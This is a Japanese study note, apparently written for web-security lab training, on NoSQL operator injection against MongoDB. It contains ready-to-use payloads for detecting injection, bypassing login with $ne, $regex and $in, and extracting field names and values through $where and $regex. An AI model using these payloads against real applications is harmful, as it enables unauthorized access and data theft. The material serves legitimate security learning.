###### クエリ演算子のリスト

|演算子|意味|
|--|--|
|$where|指定したJavaScriptコードを満たすドキュメントにマッチ|
|$ne|指定した値と等しくないすべての値にマッチ(=not equal)|
|$in|配列で指定したすべての値にマッチ|
|$regex|指定した正規表現に値がマッチするドキュメントを選択|

## Operator injectionの検出 in MongoDB

###### この手法を使う場面

- [2. NoSQL syntax injection](2.%20NoSQL%20syntax%20injection.md)によるデータの抽出や認証のバイパスができなかったとき

### ①Operator injectionの検出 by GETメソッド

- 基本
```url
?username=wiener
```
	↓
```
?username[$ne]=anything
```
- 正常なレスポンスが返れば検出

### ②Operator injectionの検出 by POSTメソッド

- GETで検出できなかった場合 or 元からPOSTメソッドの時

1. Change request methodで`POST`へ変更
2. Content type convertor -> convert to JSON
3. JSONパラメータにoperatorを注入し、正常なレスポンスが返ればそのパラメータはoperatorの注入が可能
- ⚠️：レスポンスに違いがないのであれば注入可能かはわからない。
```json
POST~
...

{"username":"wiener","password":"peter"}
```
	↓
- すべてのusername
```json
{"username":{"$ne":""},"password":"peter"}
```
	or
- すべてのpassword
```json
{"username":"wiener","password":{"$ne":""}}
```

##### `$where`が使えるかどうか

- パラメータを追加する必要がある。レスポンスに違いがあれば使える
```json
{"username":"wiener","password":"peter", "$where":"0"}
```
```json
{"username":"wiener","password":"peter", "$where":"1"}
```

## Operator injectionによる認証バイパス

1. すべてのパラメータがoperatorを注入可能なら、認証のバイパスが可能
```json
{"username":{"$ne":""},"password":{"$ne":""}}
```

- Error : "Query returned unexpected number of records"など、1つ以上のレコードが返るのを許可しない場合もある

2. `$regex`を使用し結果を1つに限定する
```json
{"username":{"$regex":"admin*"},"password":{"$ne":""}}
```

3. あるいは特定のusernameや推察したpasswordでペイロードを構築する
```json
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

## フィールド名の特定 by Operator injection

- Turbo Intruderを使用する

1. [3. NoSQL operator injection](3.%20NoSQL%20operator%20injection.md#`$where`の場合)で注入可能か判別する
2. `$where`が注入可能な箇所に、フィールドの数を検討づけるペイロードを注入する
```json
"$where":"Object.keys(this)[%s].match('.*')"
```

3. `keys()`メソッドでフィールド名を特定する
```json
"$where":"Object.keys(this)[0].match('^.{%s}%s.*')"
```
- `multipleParameters.py`を使用
- `firstWord` = `{%s}`には約0-20の数字を指定
- `secondWord` = `}%s.`にはa-z, A-Z, 0-9を指定

3. `(this)[num]`のnumを変更していき、フィールド名の数の分だけ1つずつ特定していく。

###### 上記ペイロードの基本解説
```json
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```
- `Object.keys(this)`: 現在のオブジェクト(`this`)のすべてのキーを配列として返す
- `'^.{0}a.*'`:正規表現については徳丸本p.112を参照。シングルクォートはchar型であることを意味する。
	- `^`：行の先頭
	- `.`:  任意の1文字
	- `{num}`: この前の文字が何回繰り返すか。`.{0}`は直前にある任意の文字が0回繰り返す＝何もないを表す
	- `.*`: この前の文字が0回以上繰り返す

## Operator injectionによるデータの抽出


1. [3. NoSQL operator injection](3.%20NoSQL%20operator%20injection.md#`$where`の場合)で`$where`を注入しレスポンスの違いを確認する

- 送信するJSONによりエラーメッセージが固定されてない脆弱なケースがある
```json
{"username":"wiener","password":"peter", "$where":"1"}
```
	↓
```json
{"username":"wiener","password":{"$ne":""}, "$where":"1"}
```

2. [3. NoSQL operator injection](3.%20NoSQL%20operator%20injection.md#フィールド名の特定%20by%20Operator%20injection)で抽出したいデータをもつフィールド名を特定する。

3. 特定したフィールド名のバリューを抽出していく
```json
"$where":"this.field_name.match('^.{%s}%s.*')"
```

##### `$where`が使えない時は$regexを使う

- `$regex`で抽出していく
```json
{"username":"wiener","password":{"$regex":"^.{%s}%s.*"}}
```
- レスポンスに違いがあるか確認するのは大前提
